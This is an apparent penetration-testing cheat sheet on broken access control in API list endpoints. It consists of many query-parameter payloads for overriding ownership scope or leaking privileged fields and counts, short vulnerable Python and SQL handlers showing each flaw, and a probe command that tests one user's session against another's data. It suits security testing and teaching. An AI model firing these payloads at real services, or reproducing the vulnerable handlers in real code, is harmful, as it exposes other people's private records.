# Collection filters — the list endpoint that scopes wrong

A `GET /api/things` that returns *your* objects — until a filter param
overrides the scope.

---

## 1. The shapes

```
GET /api/orders                     → your orders
GET /api/orders?user_id=1           → user 1's orders?
GET /api/orders?user=1
GET /api/orders?owner=1
GET /api/orders?owner_id=1
GET /api/orders?author=1
GET /api/orders?author_id=1
GET /api/orders?created_by=1
GET /api/orders?createdBy=1
GET /api/orders?account=1
GET /api/orders?account_id=1
GET /api/orders?tenant=1
GET /api/orders?tenant_id=1
GET /api/orders?org=1
GET /api/orders?org_id=1
GET /api/orders?team=1
GET /api/orders?team_id=1
GET /api/orders?for=1
GET /api/orders?for_user=1
GET /api/orders?of=1
GET /api/orders?by=1
GET /api/orders?whose=1
GET /api/orders?belonging_to=1
GET /api/orders?assigned_to=1
GET /api/orders?subject=1
GET /api/orders?target=1
GET /api/orders?uid=1
GET /api/orders?u=1
GET /api/orders?id=1
GET /api/orders?userid=1
GET /api/orders?userId=1
GET /api/orders?user-id=1
GET /api/orders?user.id=1
GET /api/orders?user[id]=1
GET /api/orders?filter[user_id]=1
GET /api/orders?filter[owner]=1
GET /api/orders?where[user_id]=1
GET /api/orders?where[owner]=1
GET /api/orders?q[user_id]=1
GET /api/orders?query[user_id]=1
GET /api/orders?search[user_id]=1
GET /api/orders?field=user_id&value=1
GET /api/orders?field=owner&value=1
GET /api/orders?scope=user&user=1
GET /api/orders?scope=all           — the 'all' scope override
GET /api/orders?scope=any
GET /api/orders?scope=* 
GET /api/orders?all=true
GET /api/orders?all=1
GET /api/orders?include_all=true
GET /api/orders?includeAll=true
GET /api/orders?show_all=true
GET /api/orders?showAll=true
GET /api/orders?list_all=true
GET /api/orders?listAll=true
GET /api/orders?admin=true
GET /api/orders?admin_view=true
GET /api/orders?debug=true
GET /api/orders?raw=true
GET /api/orders?internal=true
GET /api/orders?private=true
GET /api/orders?include_private=true
GET /api/orders?includePrivate=true
GET /api/orders?user_id=* 
GET /api/orders?user_id=all
GET /api/orders?user_id=%
GET /api/orders?user_id=0
GET /api/orders?user_id=-1
GET /api/orders?user_id=1,2,3       — multi
GET /api/orders?user_id[]=1
GET /api/orders?user_id[0]=1
GET /api/orders?ids=1,2,3
GET /api/orders?ids[]=1&ids[]=2
GET /api/orders?id[]=1
GET /api/orders?owner_id=1&owner_id=2  — param pollution
GET /api/orders?user_id=1&user_id=2
```

## 2. The mechanism — the scope override

```python
def list_orders(request):
    user_id = request.args.get('user_id', session.user_id)  # the override
    return Order.filter(user_id=user_id)
```

`session.user_id` is the default; a `?user_id=` param overrides it.
The bug: the param is trusted over the session.

## 3. The "the default is the bug" shape

```python
def list_orders(request):
    user_id = request.args.get('user_id')  # no default → any
    if user_id:
        return Order.filter(user_id=user_id)   # filtered by param
    return Order.filter(user_id=session.user_id)
```

The no-arg case scopes to session; the with-arg case scopes to the param.

## 4. The "the filter is a WHERE clause" bug

```python
filters = {k: v for k, v in request.args.items()}
return Order.filter(**filters)          # user_id=1 reaches the WHERE
```

Every query param becomes a filter — `?user_id=1` is one of them.

## 5. The "the scope flag" shape

```python
scope = request.args.get('scope', 'own')
if scope == 'all':
    return Order.all()                   # no scoping
return Order.filter(user_id=session.user_id)
```

`?scope=all` / `?scope=*` / `?scope=any` drops the WHERE.

## 6. The "the admin flag" shape

```python
if request.args.get('admin') or request.args.get('include_private'):
    return Order.all()
```

A debug/admin/all flag in the query drops the scope.

## 7. The "the include_private" shape

```python
qs = Order.filter(public=True)
if request.args.get('include_private'):
    qs = Order.all()
```

`?include_private=true` includes private objects.

## 8. The "the param is the JOIN" bug

```sql
SELECT * FROM orders o JOIN users u ON o.user_id = u.id
WHERE o.user_id = COALESCE(:user_id, :session_user)
```

`?user_id=` binds the `:user_id` — overrides the session.

## 9. The "the multi-id" bug

```python
ids = request.args.getlist('ids') or [session.user_id]
return Order.filter(user_id__in=ids)   # ids=1,2,3 overrides
```

`?ids=1,2,3`/`?ids[]=1&ids[]=2` is a bulk override.

## 10. The "the field+value" shape

```
?field=user_id&value=1
?field=owner&value=admin
?filter=user_id:1
?filter=owner:admin
?search=user_id=1
?where=user_id=1
?query={"user_id":1}
?q[user_id]=1
?q={"user_id":1}
?filter={"user_id":1}
?where={"user_id":1}
?user_id[gte]=0
?user_id[gt]=0
?user_id[in]=1,2,3
?user_id[$eq]=1
?user_id[$ne]=0
?user_id[$in][]=1
```

A structured filter syntax that builds the WHERE from the param.

## 11. The "the ORM-relation" path

```
?author.user_id=1
?owner.id=1
?user.id=1
?createdBy.id=1
?user__id=1
?owner__id=1
?user__id__in=1,2,3
```

The Django `__` relation or the `a.b` path — a nested filter that walks
the FK and filters by the related id.

## 12. The "the field-list" leak

```
?fields=id,email,role
?fields=id,email,secret
?fields=*
?include=email,role,secret
?include=user.role
?select=id,email,role
?columns=id,email,role
?projection=id,email,role
?attrs=id,email,role
?properties=id,email,role
?props=id,email,role
?output=id,email,role
?output_fields=id,email,role
?response_fields=id,email,role
?return=id,email,role
?returns=id,email,role
?pick=id,email,role
?only=id,email,role
```

A `?fields=`/`?include=`/`?select=` on a GET that returns *privileged
columns* (`role`, `secret`, `flag`) — the field-list picks them.

## 13. The "the expand" leak

```
?expand=user.role
?expand=owner.secret
?embed=author.role
?join=user.role
?populate=owner.secret
?with=user.role
?relations=user.role
```

An `?expand=`/`?embed=`/`?populate=` that joins the relation and leaks
its privileged fields.

## 14. The "the sort/extra" side channel

```
?sort=user_id
?sort_by=owner
?order=role
?order_by=role
?group=user_id
?group_by=owner
?aggregate=count
?distinct=user_id
```

Not a leak — but `?sort=user_id` orders by the owner column, revealing
the ordering of owners (the existence oracle).

## 15. The "the pagination" side channel

```
?page=2&per_page=1
?offset=0&limit=1
?skip=0&take=1
?cursor=<opaque>
```

Walk the pages — a `per_page=1` response tells you the total count; the
count of objects (vs your own) is the existence oracle.

## 16. The "the count" side channel

```
?count=true
?count=1
?_count=true
?meta=count
?with_count=true
?total=true
?aggregate=count
```

A `?count=true` returns the total — `{"count":42}` where you own 3
means 39 objects exist; the differential is the oracle.

## 17. The "the differential status" side channel

```
?user_id=1     → 200 (different from your default)
?user_id=9999  → 200 [] / 404 — exists vs not
```

The `200` vs `200[]`/`404` differential is the existence oracle even
without data.

## 18. The "the bound field is a param" bug

The endpoint does `Order.filter(user_id=request.args['user_id'])` —
the `user_id` is a required param, not the session. The collection is
unbounded by design; the IDOR is that any `user_id` works.

## 19. The "the admin sees all" leak

`GET /api/admin/orders` — the admin's unscoped view, reachable by a
normal user (function-level). See `function-level.md`.

## 20. The "the param beats the session" bug — verify

```bash
# B requests A's user_id — does it return A's objects?
python3 tools/web/http_probe.py --challenge "$C" --class web-idor \
  --url "$BASE/api/orders?user_id=1" --header "Cookie: session=$B" \
  --evidence-regex '"owner_id"\s*:\s*1|"email"\s*:\s*"a@' \
  --evidence-kind impact --on-match confirms --on-miss refutes
```

`confirms` → the param overrides the scope.
